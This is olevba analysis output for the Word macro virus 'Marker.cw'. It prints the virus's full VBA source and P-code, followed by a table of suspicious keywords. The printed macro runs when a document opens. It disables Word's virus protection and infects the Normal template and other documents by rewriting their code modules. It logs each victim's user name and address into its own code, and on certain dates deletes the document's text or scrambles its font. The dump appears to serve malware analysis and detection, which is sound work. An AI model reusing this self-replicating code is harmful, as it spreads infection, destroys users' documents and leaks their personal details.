olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.cw
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.cw - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open(): IT
End Sub
Private Function IT()
        
    'Application.Options.ConfirmConversions = False: Application.EnableCancelKey = wdCancelDisabled
    'FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable: FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    'CommandBars("Tools").Controls("Macro").Enabled = False
    'If Application.Version = 9# Then: CommandBars("Macro").Controls("Security...").Enabled = 0
    'If Application.Version = 8# Then
        'With Application.Options: .VirusProtection = False: .SaveNormalPrompt = False: End With
    'End If
    
    newf
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
            
End Function

Private Function newf()

    Dim maker, Oldmaker
    
    maker = "BLowMaster"
    Options.SaveNormalPrompt = False
    Dim SavDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Options.SaveNormalPrompt = False
    Oldmaker = "-> this is another maker!"
    Dim newd, nt As Object
    Options.SaveNormalPrompt = False
    
    Set newd = ActiveDocument.VBProject.VBComponents.Item(1)
    Options.SaveNormalPrompt = False
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
    Options.SaveNormalPrompt = False
           
    
    DocumentInfected = newd.CodeModule.Find(maker, 1, 1, 10000, 10000)
    Options.SaveNormalPrompt = False
    NormalTemplateInfected = nt.CodeModule.Find(maker, 1, 1, 10000, 10000)
    Options.SaveNormalPrompt = False
    
    
    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
        Options.SaveNormalPrompt = False
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
            Options.SaveNormalPrompt = False
  
            Mycode = newd.CodeModule.Lines(1, newd.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For I = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
                        Options.SaveNormalPrompt = False
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                    Options.SaveNormalPrompt = False
                End If
            Next I

            Mycode = Mycode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)


            nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
            nt.CodeModule.AddFromString Mycode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SavDocument = ActiveDocument.Saved
            Options.SaveNormalPrompt = False
    
            Mycode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

            newd.CodeModule.DeleteLines 1, newd.CodeModule.CountOfLines
            newd.CodeModule.AddFromString Mycode
    
            If SavDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = True
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
    
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
        'test
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
        ' test
    End If
    
End Function
' 11:17:42 AM - Wednesday, 22 Mar 2000
' Ditry PC
'



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.cw
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6976 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' 	BoS 0x0000 
' 	ArgsCall IT 0x0000 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Private Function IT(id_FFFE As Variant))
' Line #4:
' Line #5:
' 	QuoteRem 0x0004 0x005E "Application.Options.ConfirmConversions = False: Application.EnableCancelKey = wdCancelDisabled"
' Line #6:
' 	QuoteRem 0x0004 0x0063 "FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable: FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable"
' Line #7:
' 	QuoteRem 0x0004 0x0036 "CommandBars("Tools").Controls("Macro").Enabled = False"
' Line #8:
' 	QuoteRem 0x0004 0x005A "If Application.Version = 9# Then: CommandBars("Macro").Controls("Security...").Enabled = 0"
' Line #9:
' 	QuoteRem 0x0004 0x0020 "If Application.Version = 8# Then"
' Line #10:
' 	QuoteRem 0x0008 0x0057 "With Application.Options: .VirusProtection = False: .SaveNormalPrompt = False: End With"
' Line #11:
' 	QuoteRem 0x0004 0x0006 "End If"
' Line #12:
' Line #13:
' 	ArgsCall newf 0x0000 
' Line #14:
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #17:
' Line #18:
' 	EndFunc 
' Line #19:
' Line #20:
' 	FuncDefn (Private Function newf(id_FFFE As Variant))
' Line #21:
' Line #22:
' 	Dim 
' 	VarDefn maker
' 	VarDefn Oldmaker
' Line #23:
' Line #24:
' 	LitStr 0x000A "BLowMaster"
' 	St maker 
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #26:
' 	Dim 
' 	VarDefn SavDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #28:
' 	LitStr 0x0019 "-> this is another maker!"
' 	St Oldmaker 
' Line #29:
' 	Dim 
' 	VarDefn newd
' 	VarDefn nt (As Object)
' Line #30:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #31:
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set newd 
' Line #33:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #34:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #35:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #36:
' Line #37:
' Line #38:
' 	Ld maker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld newd 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #39:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #40:
' 	Ld maker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #41:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #42:
' Line #43:
' Line #44:
' 	QuoteRem 0x0004 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #45:
' 	LineCont 0x0008 0B 00 08 00 12 00 08 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #46:
' Line #47:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #48:
' 	QuoteRem 0x0008 0x0019 "Infect the NormalTemplate"
' Line #49:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #50:
' Line #51:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #52:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #53:
' Line #54:
' 	LitDI2 0x0001 
' 	Ld newd 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld newd 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Mycode 
' Line #55:
' Line #56:
' 	QuoteRem 0x000C 0x0031 "Write a log file of this NormalTemplate infection"
' Line #57:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #58:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #59:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #60:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #61:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	ElseBlock 
' Line #64:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #65:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #68:
' Line #69:
' 	LineCont 0x0010 09 00 16 00 12 00 16 00 1E 00 16 00 29 00 16 00
' 	Ld Mycode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Mycode 
' Line #70:
' Line #71:
' Line #72:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #73:
' 	Ld Mycode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #74:
' Line #75:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #76:
' Line #77:
' 	EndIfBlock 
' Line #78:
' Line #79:
' Line #80:
' 	QuoteRem 0x0008 0x0019 "Infect the ActiveDocument"
' Line #81:
' 	LineCont 0x0008 05 00 0C 00 13 00 0D 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #82:
' Line #83:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SavDocument 
' Line #84:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #85:
' Line #86:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Mycode 
' Line #87:
' Line #88:
' 	LitDI2 0x0001 
' 	Ld newd 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld newd 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #89:
' 	Ld Mycode 
' 	Ld newd 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #90:
' Line #91:
' 	Ld SavDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #92:
' Line #93:
' 	EndIfBlock 
' Line #94:
' Line #95:
' 	EndIfBlock 
' Line #96:
' Line #97:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #98:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #99:
' Line #100:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #101:
' Line #102:
' 	Ld ActiveDocument 
' 	ArgsMemCall Set 0x0000 
' Line #103:
' 	Ld Selection 
' 	ArgsMemCall Cut 0x0000 
' Line #104:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #105:
' 	QuoteRem 0x0008 0x0004 "test"
' Line #106:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	ElseIfBlock 
' Line #107:
' 	Ld ActiveDocument 
' 	ArgsMemCall Set 0x0000 
' Line #108:
' 	LitStr 0x0008 "Webdings"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #109:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #110:
' 	QuoteRem 0x0008 0x0005 " test"
' Line #111:
' 	EndIfBlock 
' Line #112:
' Line #113:
' 	EndFunc 
' Line #114:
' 	QuoteRem 0x0000 0x0025 " 11:17:42 AM - Wednesday, 22 Mar 2000"
' Line #115:
' 	QuoteRem 0x0000 0x0009 " Ditry PC"
' Line #116:
' 	QuoteRem 0x0000 0x0000 ""
' Line #117:
' Line #118:
' Line #119:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

